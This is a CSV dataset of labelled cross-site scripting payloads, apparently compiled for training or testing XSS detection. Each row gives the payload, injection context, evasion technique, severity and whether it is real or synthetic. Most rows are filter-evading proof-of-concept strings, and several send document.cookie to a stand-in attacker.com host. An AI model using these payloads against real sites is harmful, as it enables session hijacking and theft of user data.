payload,context,technique,severity,length,source
`><img src=x oninput=&#97;l&#101;rt(1)>,attribute_escape,synthetic,low,39,synthetic
<&#97;nim&#97;t&#101;motion ondblclick=consol&#101;.log(1) ondblclick=consol&#101;.log(1)>,tag_injection,synthetic,low,90,synthetic
 onAuxCliCk=ProMpt('XSS'),event_handler,synthetic,medium,25,synthetic
<input3 onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
<progress onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</progress><input value=clickme>,tag_injection,none,medium,116,real
<time onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,66,real
"' ><svg onpointerover=console.log(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,65,synthetic
<&#97;udio onscroll&#101;nd=prompt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,58,synthetic
"<figure onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</figure>",tag_injection,none,medium,73,real
`><Img srC=x onFocUsoUt=AleRt(LocAtiOn.HasH)>,attribute_escape,synthetic,medium,45,synthetic
""" ><svg onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>",attribute_escape,synthetic,low,100,synthetic
%3Ca/onkeypress=confirm(1)%3E,tag_injection,synthetic,medium,29,synthetic
`%3E%3Cimg src=x oninvalid=alert(document.domain)%3E,attribute_escape,synthetic,medium,52,synthetic
""" ><svg onwh&#101;&#101;l=prompt(loc&#97;tion.h&#97;sh)>",attribute_escape,synthetic,medium,56,synthetic
"""%3E%3Cimg src=x onanimationiteration=confirm('XSS')%3E",attribute_escape,synthetic,medium,55,synthetic
"<area draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</area>",tag_injection,none,medium,85,real
"<footer onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</footer>",tag_injection,none,medium,73,real
"""><SelEct onMouSewHeeL=aLerT(dOcuMenT.dOmaIn)>",tag_injection,synthetic,medium,46,synthetic
""" ><svG oNanImaTioNenD=cOnsOle.loG('XSS')>",attribute_escape,synthetic,medium,42,synthetic
\' onsearch=prompt(location.hash)//,attribute_escape,synthetic,medium,35,synthetic
<!--><NosCriPt OnpOinTerDowN=pRomPt(DocUmeNt.DomAin)>,tag_injection,synthetic,medium,53,synthetic
<s onfocusout=alert(1) tabindex=1 id=x></s><input autofocus>,tag_injection,none,medium,60,real
"' ><svg onpointerover=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,61,synthetic
"<svg draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</svg>",tag_injection,none,medium,84,real
\' onended=alert('XSS')//,attribute_escape,synthetic,medium,25,synthetic
' ><svg onmous&#101;ov&#101;r=confirm('XSS')>,attribute_escape,synthetic,medium,45,synthetic
\' OndRop=alErt('XSS')//,attribute_escape,synthetic,medium,24,synthetic
""" %3E%3Csvg oncontextmenu=alert(1)%3E",attribute_escape,synthetic,medium,37,synthetic
<teMplAte onResEt=AleRt(LocAtiOn.HasH)/>,tag_injection,synthetic,medium,40,synthetic
\%22 onanimationend=console.log(%27XSS%27)//,attribute_escape,synthetic,medium,44,synthetic
%22><title onstalled=alert(%27XSS%27)>,tag_injection,synthetic,medium,38,synthetic
' onpaste=console.log(document.domain) ',attribute_escape,synthetic,medium,40,synthetic
`><img src=x ontransitionend=alert(document.domain)>,attribute_escape,synthetic,medium,52,synthetic
'%3E%3Cimg src=x onanimationiteration=confirm('XSS')%3E,attribute_escape,synthetic,medium,55,synthetic
""" %3E%3Csvg oncut=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,63,synthetic
"""><img src=x onsearch=\u0061lert('XSS')>",attribute_escape,synthetic,low,40,synthetic
<IMG SRC= jav&#x09;ascript:alert( AnonKryptiQuz ); >,generic,html_entity|whitespace_obfuscation|case_variation,medium,52,real
"\"" onmousewheel=\u0061lert(document.domain)//",attribute_escape,synthetic,low,45,synthetic
"<time onmouseleave=""alert(1)"">AnonKryptiQuz</time>",tag_injection,none,medium,50,real
"""><img src=x onpromptdismiss=consol&#101;.log('XSS')>",attribute_escape,synthetic,low,53,synthetic
'><img src=x onanimationend=confirm(location.hash)>,attribute_escape,synthetic,medium,51,synthetic
<svg onload=eval(document.cookie)>,dom_sink,encoding,high,34,real
"__proto__[""onk&#101;ypr&#101;ss""]=XMLHttpR&#101;qu&#101;st('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)",dom_sink,synthetic,high,119,synthetic
"<style>@keyframes x{}</style><s style=""animation-name:x"" onanimationstart=""alert(1)""></s>",tag_injection,none,medium,89,real
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=prompt(%27//attacker.com/?c=%27+document.cookie)>%22)",dom_sink,synthetic,high,118,synthetic
' oNbeGin=coNsoLe.Log(loCatIon.haSh) ',attribute_escape,synthetic,medium,38,synthetic
"<abbr onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</abbr>",tag_injection,none,medium,70,real
<body id=x tabindex=1 ondeactivate=alert(1)></body><input id=y autofocus>,tag_injection,none,medium,73,real
%22><img src=x onbeforepaste=alert(%27XSS%27)>,attribute_escape,synthetic,medium,46,synthetic
<listing onpointerrawupdate=\u0061lert('XSS')>,tag_injection,synthetic,low,46,synthetic
%27 ><svg ontouchmove=confirm(document.domain)>,attribute_escape,synthetic,medium,47,synthetic
"<style>:target {color:red;}</style><svg id=x style=""transition:color 1s"" ontransitionstart=alert(1)></svg>",tag_injection,none,medium,106,real
"<content draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</content>",tag_injection,none,medium,92,real
%22 onwebkitanimationend=console.log(document.domain) %22,attribute_escape,synthetic,medium,57,synthetic
"""><table oninvalid=prompt('XSS')>",tag_injection,synthetic,medium,33,synthetic
`%3E%3Cimg src=x onpromptaction=console.log('XSS')%3E,attribute_escape,synthetic,medium,53,synthetic
"<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(123)}),x</script>",script_injection,none,medium,92,real
"\' onpointerrawupdate=confirm(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,62,synthetic
"<scr	ipt
>prompt('XSS')</scr	ipt>",script_injection,synthetic,medium,33,synthetic
<SCRIPT>cOnsOle.loG(1)</SCRIPT>,script_injection,synthetic,medium,31,synthetic
"<i onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</i>",tag_injection,none,medium,55,real
"&#101;v&#97;l(""confirm(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)"")",dom_sink,synthetic,medium,82,synthetic
javascript:void(\u0061lert(location.hash)),js_uri,synthetic,low,42,synthetic
"%22 ontouchend=prompt(String.fromCharCode(88,83,83)) %22",attribute_escape,synthetic,high,56,synthetic
 onfocusin=confirm('XSS'),event_handler,synthetic,medium,25,synthetic
"<meta content=""&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(2609)"" http-equiv=""refresh""/>",tag_injection,none,medium,91,real
%3Clisting onpopstate=prompt(document.domain) onpopstate=prompt(document.domain)%3E,tag_injection,synthetic,medium,83,synthetic
"SetIntErvAl(""prOmpT(dOcuMenT.cOokIe)"",100)",dom_sink,synthetic,high,42,synthetic
"LocAtiOn.HreF=""JavAscRipT:XMLHTtpReqUesT(bToa(doCumEnt.coOkiE))""",dom_sink,synthetic,high,64,synthetic
"<dialog
onstalled=confirm(%27XSS%27)>",tag_injection,synthetic,medium,37,synthetic
java	script:confirm(1),js_uri,synthetic,medium,22,synthetic
<meTa	OnsEcuRitYpoLicYviOlaTioN=pRomPt('XSS')>,tag_injection,synthetic,medium,46,synthetic
"<pre oncontextmenu=""alert(1)"">AnonKryptiQuz</pre>",tag_injection,none,medium,49,real
OnaNimAtiOniTerAtiOn=JavAscRipT:cOnfIrm('XSS'),event_handler,synthetic,medium,46,synthetic
<tr src=x onpoint&#101;rr&#97;wupd&#97;t&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,85,synthetic
"""><body oninvalid=alert(location.hash)>",tag_injection,synthetic,medium,39,synthetic
"`><img src=x ontouchend=prompt(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,62,synthetic
"<applet onmousedown=""alert(1)"">AnonKryptiQuz</applet>",tag_injection,none,medium,53,real
"""><body onpointermove=\u0061lert(location.hash)>",tag_injection,synthetic,low,48,synthetic
<pl&#97;int&#101;xt/onp&#97;g&#101;r&#101;v&#101;&#97;l=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,94,synthetic
${confirm?new()(''XSS'')},template_injection,synthetic,low,25,synthetic
JAVASCRIPT:&#97;l&#101;rt('XSS'),js_uri,synthetic,low,32,synthetic
onmousedown=console.log&#40;%27XSS%27&#41;,event_handler,synthetic,low,42,synthetic
"document.write(""%3Cimg src=x onerror=alert('//attacker.com/?c='+document.cookie)%3E"")",dom_sink,synthetic,high,85,synthetic
"\"" onfocus=prompt(loc&#97;tion.h&#97;sh)//",attribute_escape,synthetic,medium,42,synthetic
"&#101;l&#101;m&#101;nt.ins&#101;rtAdj&#97;c&#101;ntHTML(""b&#101;for&#101;&#101;nd"",""<img src=x on&#101;rror=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>"")",dom_sink,synthetic,low,148,synthetic
"<img src=""livescript:document.vulnerable=true;"">",dom_sink,none,low,48,real
\' onpopstate=confirm(document.domain)//,attribute_escape,synthetic,medium,40,synthetic
__proto__[%22onpointercancel%22]=eval(location.hash),dom_sink,synthetic,low,52,synthetic
"<&#97;
onk&#101;ypr&#101;ss=confirm(1)>",tag_injection,synthetic,medium,39,synthetic
<img src=”invalid-image” onerror=”alert(document.cookie)”>,dom_sink,none,high,58,real
"<frame draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</frame>",tag_injection,none,medium,87,real
"""><script>confirm(docum&#101;nt.dom&#97;in)</script>",script_injection,synthetic,medium,52,synthetic
"<IMG SRC=x ononline=""alert(String.fromCharCode(88,83,83))"">",tag_injection,encoding|case_variation,high,59,real
<marquee onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,57,real
<scr	ipt>/x/prompt('XSS')</scr	ipt>,script_injection,synthetic,medium,35,synthetic
on&#97;uxclick=prompt/**/(1),event_handler,synthetic,low,28,synthetic
&quot; onhashchange=console.log(document.domain) x=&quot;,attribute_escape,synthetic,medium,57,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><marquee id=x style=""position:absolute;"" onanimationcancel=""print()""></marquee>",tag_injection,none,low,183,real
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=alert(1)>%22)",dom_sink,synthetic,medium,78,synthetic
"<scr	ipt>//console.log(String.fromCharCode(88,83,83))</scr	ipt>",script_injection,synthetic,high,63,synthetic
<&#97;r&#101;&#97;/onpoint&#101;rc&#97;nc&#101;l=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,low,92,synthetic
"OnwEbkItaNimAtiOneNd=ProMpt/**/(STriNg.FroMChArCOde(88,83,83))",event_handler,synthetic,high,62,synthetic
OnpLayIng=alErt/*x*/(1),event_handler,synthetic,low,23,synthetic
<html id=x tabindex=1 onbeforedeactivate=alert(1)></html><input autofocus>,tag_injection,none,medium,74,real
"<iframe src=""http://example.com/"" style=""width:800px; height:350px; border:none; mask: url(#maskForClickjacking);""/>",attribute_escape,none,low,116,real
"""><scr	ipt>alert('XSS')</scr	ipt>",script_injection,synthetic,medium,33,synthetic
<script>//&#97;l&#101;rt(docum&#101;nt.dom&#97;in)</script>,script_injection,synthetic,low,59,synthetic
"<blink ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</blink>",tag_injection,none,medium,91,real
"__proto__[""onfullscreenchange""]=fetch(document.cookie+'&loc='+location.href)",dom_sink,synthetic,high,76,synthetic
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=f&#101;tch(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))>""",dom_sink,synthetic,low,172,synthetic
<spacer onpointermove=alert(1) style=display:block>AnonKryptiQuz</spacer>,tag_injection,none,medium,73,real
%3Ctable oninvalid=prompt('XSS') oninvalid=prompt('XSS')%3E,tag_injection,synthetic,medium,59,synthetic
'><img src=x onsecuritypolicyviolation=console.log(document.domain)>,attribute_escape,synthetic,medium,68,synthetic
<base oninput=\u0061lert('XSS') oninput=\u0061lert('XSS')>,tag_injection,synthetic,low,58,synthetic
'%26%26'javascript:alert%25281%2529//,js_uri,url_encoding,low,37,real
"'%3E%3Cimg src=x onvolumechange=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,72,synthetic
%22 ondragstart=console.log(location.hash) %22,attribute_escape,synthetic,medium,46,synthetic
""" ><svg onpause=confirm('XSS')>",attribute_escape,synthetic,medium,31,synthetic
"SetTimEouT(""ProMpt(doCumEnt.doMaiN)"",0)",dom_sink,synthetic,medium,39,synthetic
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""&#97;l&#101;rt('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)""",dom_sink,synthetic,low,144,synthetic
"\' onanimationiteration=confirm(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,64,synthetic
"""><scr	ipt>prompt(location.hash)</scr	ipt>",script_injection,synthetic,medium,42,synthetic
"__pRotO__[""oNauXclIck""]=EvaL('//aTtaCkeR.cOm/?c='+dOcuMenT.cOokIe)",dom_sink,synthetic,high,66,synthetic
<SCRIPT>alert(%27XSS%27)</SCRIPT>,script_injection,synthetic,medium,33,synthetic
'><img src=x onpointercancel=prompt(1)>,attribute_escape,synthetic,medium,39,synthetic
"<tbody draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</tbody>",tag_injection,none,medium,86,real
location=%22javascript:XMLHttpRequest(1)%22,dom_sink,synthetic,high,43,synthetic
OnbEfoRepAstE=cOnsOle.loG/***/(doCumEnt.doMaiN),event_handler,synthetic,low,47,synthetic
""" onanimationiteration=prompt(1) """,attribute_escape,synthetic,medium,34,synthetic
' ><svg onpointerup=prompt(location.hash)>,attribute_escape,synthetic,medium,42,synthetic
"location.href=""javascript:eval(localStorage.getItem('token'))""",dom_sink,synthetic,high,62,synthetic
"EleMenT.sEtATtrIbuTe(""onCliCk"",""pRomPt(1)"")",dom_sink,synthetic,medium,43,synthetic
'><Img srC=x onEndEd=AleRt('XSS')>,attribute_escape,synthetic,medium,34,synthetic
"setInterval(""console.log(document.domain)"",100)",dom_sink,synthetic,high,47,synthetic
<script\x20>javascript:alert(1)</script>,script_injection,none,medium,40,real
`%3E%3Cimg src=x onpromptdismiss=prompt(document.domain)%3E,attribute_escape,synthetic,medium,59,synthetic
<script>/* *\x00/javascript:alert(4590)// */</script>,script_injection,comment_injection,medium,53,real
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>""",dom_sink,synthetic,low,115,synthetic
OnsCroLlsNapChaNge=coNfiRm/**/(doCumEnt.doMaiN),event_handler,synthetic,low,47,synthetic
""" %3E%3Csvg onbegin=confirm(1)%3E",attribute_escape,synthetic,medium,33,synthetic
""" oNbeForEpaSte=prOmpT(STriNg.FroMChArCOde(88,83,83)) """,attribute_escape,synthetic,high,55,synthetic
' ><svG oNprOmpTdiSmiSs=ConSolE.lOg('XSS')>,attribute_escape,synthetic,medium,43,synthetic
"\"" OnpOinTerMovE=aLerT(STriNg.FroMChArCOde(88,83,83))//",attribute_escape,synthetic,high,55,synthetic
&quOt; onScrOllSnaPchAngE=cOnsOle.loG(1) x=&qUot;,attribute_escape,synthetic,medium,49,synthetic
"WinDow[""XMLHTtpReqUesT""]('//atTacKer.coM/?C='+doCumEnt.coOkiE)",dom_sink,synthetic,high,62,synthetic
"__pRotO__[""oNauXclIck""]=XMLHttPReQueSt(DocUmeNt.DomAin)",dom_sink,synthetic,high,55,synthetic
%3Caudio/onmouseover=console.log('XSS')%3E,tag_injection,synthetic,medium,42,synthetic
&#x3c;,generic,html_entity,low,6,real
&quot; onc&#97;npl&#97;y=consol&#101;.log(loc&#97;tion.h&#97;sh) x=&quot;,attribute_escape,synthetic,low,73,synthetic
<mark onpointerout=alert(1) style=display:block>AnonKryptiQuz</mark>,tag_injection,none,medium,68,real
""" ><svg onauxclick=alert(1)>",attribute_escape,synthetic,medium,28,synthetic
"__proto__[""onwebkitfullscreenchange""]=eval(1)",dom_sink,synthetic,low,45,synthetic
<script>/*/alert(document.domain)</script>,script_injection,synthetic,medium,42,synthetic
<im&#97;g&#101;/on&#101;nd=prompt(1)>,tag_injection,synthetic,medium,37,synthetic
<script>alert()</script>,script_injection,none,medium,24,real
ondr&#97;gov&#101;r=confirm&#40;'XSS'&#41;,event_handler,synthetic,low,42,synthetic
document.write(%22<img src=x onerror=eval(%27XSS%27)>%22),dom_sink,synthetic,low,57,synthetic
" onTraNsiTioNstArt=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))",event_handler,synthetic,high,61,synthetic
"window[""confirm""](document.cookie)",dom_sink,synthetic,high,34,synthetic
\' oncontextmenu=\u0061lert(document.domain)//,attribute_escape,synthetic,low,46,synthetic
"<audio onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</audio>",tag_injection,none,medium,63,real
"__proto__[""onpageshow""]=eval(document.cookie)",dom_sink,synthetic,high,45,synthetic
"<track onmouseup=""alert(1)"">AnonKryptiQuz</track>",tag_injection,none,medium,49,real
\' OnpOpsTatE=aLerT(dOcuMenT.dOmaIn)//,attribute_escape,synthetic,medium,38,synthetic
"onfocusout=javascr	ipt:prompt(String.fromCharCode(88,83,83))",event_handler,synthetic,high,60,synthetic
""" ><svg onreset=alert('XSS')>",attribute_escape,synthetic,medium,29,synthetic
<a2 onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</a2><input value=clickme>,tag_injection,none,medium,104,real
"ontransitionstart=prompt&#40;String.fromCharCode(88,83,83)&#41;",event_handler,synthetic,high,63,synthetic
""" ><svg ondrop=\u0061lert('XSS')>",attribute_escape,synthetic,low,33,synthetic
&#X000003c;,generic,html_entity,low,11,real
" onBefOrePasTe=AleRt(StrIng.frOmCHarCodE(88,83,83))",event_handler,synthetic,high,51,synthetic
"<style>:target {transform: rotate(180deg);}</style><frameset id=x style=""transition:transform 2s"" ontransitionrun=print()></frameset>",tag_injection,none,low,133,real
\%22 onmouseup=console.log(%27XSS%27)//,attribute_escape,synthetic,medium,39,synthetic
`><img src=x ontouch&#101;nd=prompt('XSS')>,attribute_escape,synthetic,medium,43,synthetic
"""><img src=x ontouchend=confirm('XSS')>",attribute_escape,synthetic,medium,39,synthetic
" onPoiNteRcaNceL=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))",event_handler,synthetic,high,55,synthetic
"""><Img srC=x onEndEd=ProMpt(doCumEnt.doMaiN)>",attribute_escape,synthetic,medium,45,synthetic
<baSe	OnkEydOwn=alErt('XSS')>,tag_injection,synthetic,medium,29,synthetic
on&#97;uxclick=confirm(docum&#101;nt.dom&#97;in),event_handler,synthetic,medium,48,synthetic
"<tfoot onmousemove=""alert(1)"">AnonKryptiQuz</tfoot>",tag_injection,none,medium,51,real
<&#97;udio onmous&#101;ov&#101;r=consol&#101;.log('XSS') onmous&#101;ov&#101;r=consol&#101;.log('XSS')>,tag_injection,synthetic,low,103,synthetic
%3C!--%3E%3Carea onpointercancel=console.log(document.domain)%3E,tag_injection,synthetic,medium,64,synthetic
%22 ><svg ongestureend=alert(1)>,attribute_escape,synthetic,medium,32,synthetic
 onmousedown=confirm(%27XSS%27),event_handler,synthetic,medium,31,synthetic
"setTimeout(""fetch(navigator.sendBeacon('//attacker.com',document.cookie))"",0)",dom_sink,synthetic,high,77,synthetic
""" %3E%3Csvg onpagereveal=console.log(document.domain)%3E",attribute_escape,synthetic,medium,56,synthetic
"<style>@keyframes x{}</style><listing style=""animation-name:x"" onwebkitanimationend=""alert(1)""></listing>",tag_injection,none,medium,105,real
"ong&#101;stur&#101;&#101;nd=j&#97;v&#97;script:confirm(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,medium,94,synthetic
"""%3E%3Cimg src=x onpromptaction=prompt(location.hash)%3E",attribute_escape,synthetic,medium,56,synthetic
"%3Cscript
%3Ealert(1)%3C/script%3E",script_injection,synthetic,medium,34,synthetic
document.write(%22<img src=x onerror=fetch(document.cookie+%27&loc=%27+location.href)>%22),dom_sink,synthetic,high,90,synthetic
"<footer draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</footer>",tag_injection,none,medium,90,real
onauxclick=console.log('XSS'),event_handler,synthetic,medium,29,synthetic
<!--><dialog onpagehide=console.log(1)>,tag_injection,synthetic,medium,39,synthetic
"'><Img srC=x onAniMatIonCanCel=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape,synthetic,high,74,synthetic
"<rtc draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</rtc>",tag_injection,none,medium,82,real
%27><img src=x ontouchend=prompt(%27XSS%27)>,attribute_escape,synthetic,medium,44,synthetic
<meta/onsecuritypolicyviolation=prompt('XSS')>,tag_injection,synthetic,medium,46,synthetic
' ><svg ondr&#97;gov&#101;r=prompt(1)>,attribute_escape,synthetic,medium,38,synthetic
' on&#101;nd=confirm('XSS') ',attribute_escape,synthetic,medium,29,synthetic
<xss/onmous&#101;ov&#101;r=consol&#101;.log('XSS')>,tag_injection,synthetic,low,51,synthetic
"\"" onfocusout=confirm(loc&#97;tion.h&#97;sh)//",attribute_escape,synthetic,medium,46,synthetic
<q contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,55,real
"""><Img srC=x onTogGle=alErt(doCumEnt.doMaiN)>",attribute_escape,synthetic,medium,45,synthetic
%3C!--%3E%3Ctitle onmozfullscreenchange=prompt('XSS')%3E,tag_injection,synthetic,medium,56,synthetic
' ><svG oNgoTpoIntErcAptUre=prOmpT('XSS')>,attribute_escape,synthetic,medium,42,synthetic
"onr&#101;p&#101;&#97;t=j&#97;v&#97;script:&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,low,96,synthetic
"document.write(""<img src=x onerror=confirm(btoa(document.cookie))>"")",dom_sink,synthetic,high,68,synthetic
<pre onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54,real
<IMG SRC=javascript:alert('AnonKryptiQuz')>,js_uri,case_variation,medium,43,real
"""><area onpageshow=prompt('XSS')>",tag_injection,synthetic,medium,33,synthetic
<%= \u0061lert document.cookie %>,template_injection,synthetic,high,33,synthetic
"""><script+src=""http://search.twitter.com/trends.json?callback=alert()""></script>",script_injection,none,medium,80,real
"</textarea>'""><script>alert(document.cookie)</script>",dom_sink,none,high,53,real
__proto__[%22onerror%22]=XMLHttpRequest(document.domain),dom_sink,synthetic,high,56,synthetic
<title onpointermove=alert(1) style=display:block>AnonKryptiQuz</title>,tag_injection,none,medium,71,real
""" ontouchstart=prompt(document.domain) """,attribute_escape,synthetic,medium,40,synthetic
\%27 ongesturestart=prompt(%27XSS%27)//,attribute_escape,synthetic,medium,39,synthetic
"<address onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</address>",tag_injection,none,medium,75,real
"<noframes onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</noframes>",tag_injection,none,medium,72,real
`><Img srC=x onResEt=ProMpt(loCatIon.haSh)>,attribute_escape,synthetic,medium,43,synthetic
<head onpointerout=alert(1) style=display:block>AnonKryptiQuz</head>,tag_injection,none,medium,68,real
"%27><img src=x onpointerup=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,66,synthetic
"<img src\x09=x onerror=""javascript:alert(1)"">",js_uri,none,medium,45,real
"""%3E%3Cimg src=x onbeforepaste=console.log('XSS')%3E",attribute_escape,synthetic,medium,52,synthetic
"__pRotO__[""oNanImaTioNcaNceL""]=coNfiRm(NavIgaTor.seNdBEacOn('//AttAckEr.Com',dOcuMenT.cOokIe))",dom_sink,synthetic,high,94,synthetic
""" ><svG oNmoUseWheEl=AleRt(DocUmeNt.DomAin)>",attribute_escape,synthetic,medium,44,synthetic
"<tbody onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</tbody>",tag_injection,none,medium,71,real
"""><Set onPoiNteRmoVe=ConFirM(lOcaTioN.hAsh)>",tag_injection,synthetic,medium,44,synthetic
<animatemotion onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</animatemotion>,tag_injection,none,medium,92,real
""" ><svg onfocus=alert(1)>",attribute_escape,synthetic,medium,25,synthetic
"""><img src=x ontouchmove=confirm('XSS')>",attribute_escape,synthetic,medium,40,synthetic
"onfocusout=javascr	ipt:console.log(String.fromCharCode(88,83,83))",event_handler,synthetic,high,65,synthetic
'><img src=x onp&#97;g&#101;hid&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,low,81,synthetic
"&quot; ontransitionstart=confirm(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape,synthetic,high,72,synthetic
"%3Cdiv
onpause=confirm(location.hash)%3E",tag_injection,synthetic,medium,40,synthetic
"<object onmousedown=""alert(1)"">AnonKryptiQuz</object>",tag_injection,none,medium,53,real
<% alert('XSS') %>,template_injection,synthetic,medium,18,synthetic
<dialog x=y onended=console.log(1)>,tag_injection,synthetic,medium,35,synthetic
\%27 onpointerup=alert(1)//,attribute_escape,synthetic,medium,27,synthetic
"(new Function(""fetch(document.cookie)""))();",dom_sink,synthetic,high,43,synthetic
"\"" onbeforepaste=\u0061lert('XSS')//",attribute_escape,synthetic,low,36,synthetic
<!--><animate onpageshow=console.log(%27XSS%27)>,tag_injection,synthetic,medium,48,synthetic
<viDeo onCliCk=ConSolE.lOg('XSS') onCliCk=ConSolE.lOg('XSS')>,tag_injection,synthetic,medium,61,synthetic
onwh&#101;&#101;l=consol&#101;.log/*x*/(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,65,synthetic
<button onpointerenter=alert(1) style=display:block>AnonKryptiQuz</button>,tag_injection,none,medium,74,real
' ><svG oNenDed=coNsoLe.Log(1)>,attribute_escape,synthetic,medium,31,synthetic
"	onwebkittransitionend=alert(String.fromCharCode(88,83,83))",event_handler,synthetic,high,59,synthetic
<!--><xss onkeypress=console.log(1)>,tag_injection,synthetic,medium,36,synthetic
"__pRotO__[""oNpoIntErcAncEl""]=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))",dom_sink,synthetic,high,71,synthetic
JAVASCRIPT:\u0061lert(location.hash),js_uri,synthetic,low,36,synthetic
"__proto__[""onpointerup""]=fetch(btoa(document.cookie))",dom_sink,synthetic,high,53,synthetic
{{constructor[%27constructor%27](%27confirm(document.domain)%27)()}},template_injection,synthetic,medium,68,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><audio id=x style=""position:absolute;"" onanimationcancel=""print()""></audio>",tag_injection,none,low,179,real
"""%3E%3Cimg src=x onkeypress=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,73,synthetic
<source onpointerenter=alert(1) style=display:block>AnonKryptiQuz</source>,tag_injection,none,medium,74,real
J&#97;VasCriPt:AleRt(1),js_uri,synthetic,medium,23,synthetic
